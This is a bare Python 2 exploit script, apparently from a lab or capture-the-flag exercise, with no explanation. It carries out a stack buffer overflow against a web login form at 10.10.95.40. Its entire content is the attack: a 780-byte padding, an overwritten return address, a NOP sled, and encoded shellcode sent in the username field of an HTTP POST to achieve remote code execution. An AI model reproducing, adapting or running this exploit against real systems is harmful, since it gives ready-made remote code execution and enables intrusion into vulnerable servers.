import socket, os, sys

offset = 780

crash = ("A" * offset)

eip = "\x83\x0C\x09\x10"

nops = "\x90" * 32

payload = ("\xdb\xc6\xd9\x74\x24\xf4\x5a\xbf\x74\x44\x29\x44\x29\xc9\xb1"
"\x52\x31\x7a\x17\x83\xea\xfc\x03\x0e\x57\xcb\xb1\x12\xbf\x89"
"\x3a\xea\x40\xee\xb3\x0f\x71\x2e\xa7\x44\x22\x9e\xa3\x08\xcf"
"\x55\xe1\xb8\x44\x1b\x2e\xcf\xed\x96\x08\xfe\xee\x8b\x69\x61"
"\x6d\xd6\xbd\x41\x4c\x19\xb0\x80\x89\x44\x39\xd0\x42\x02\xec"
"\xc4\xe7\x5e\x2d\x6f\xbb\x4f\x35\x8c\x0c\x71\x14\x03\x06\x28"
"\xb6\xa2\xcb\x40\xff\xbc\x08\x6c\x49\x37\xfa\x1a\x48\x91\x32"
"\xe2\xe7\xdc\xfa\x11\xf9\x19\x3c\xca\x8c\x53\x3e\x77\x97\xa0"
"\x3c\xa3\x12\x32\xe6\x20\x84\x9e\x16\xe4\x53\x55\x14\x41\x17"
"\x31\x39\x54\xf4\x4a\x45\xdd\xfb\x9c\xcf\xa5\xdf\x38\x8b\x7e"
"\x41\x19\x71\xd0\x7e\x79\xda\x8d\xda\xf2\xf7\xda\x56\x59\x90"
"\x2f\x5b\x61\x60\x38\xec\x12\x52\xe7\x46\xbc\xde\x60\x41\x3b"
"\x20\x5b\x35\xd3\xdf\x64\x46\xfa\x1b\x30\x16\x94\x8a\x39\xfd"
"\x64\x32\xec\x52\x34\x9c\x5f\x13\xe4\x5c\x30\xfb\xee\x52\x6f"
"\x1b\x11\xb9\x18\xb6\xe8\x2a\x2d\x4e\xd7\xd1\x59\x52\x17\x05"
"\x87\xdb\xf1\x23\xa7\x8d\xaa\xdb\x5e\x94\x20\x7d\x9e\x02\x4d"
"\xbd\x14\xa1\xb2\x70\xdd\xcc\xa0\xe5\x2d\x9b\x9a\xa0\x32\x31"
"\xb2\x2f\xa0\xde\x42\x39\xd9\x48\x15\x6e\x2f\x81\xf3\x82\x16"
"\x3b\xe1\x5e\xce\x04\xa1\x84\x33\x8a\x28\x48\x0f\xa8\x3a\x94"
"\x90\xf4\x6e\x48\xc7\xa2\xd8\x2e\xb1\x04\xb2\xf8\x6e\xcf\x52"
"\x7c\x5d\xd0\x24\x81\x88\xa6\xc8\x30\x65\xff\xf7\xfd\xe1\xf7"
"\x80\xe3\x91\xf8\x5b\xa0\xa2\xb2\xc1\x81\x2a\x1b\x90\x93\x36"
"\x9c\x4f\xd7\x4e\x1f\x65\xa8\xb4\x3f\x0c\xad\xf1\x87\xfd\xdf"
"\x6a\x62\x01\x73\x8a\xa7")

buff = crash + eip + nops + payload

fuzz="username="+buff+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 10.10.95.40\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://10.10.95.40/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
buffer+="\r\n"
buffer+=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("10.10.95.40", 80))
expl.send(buffer)
expl.close()
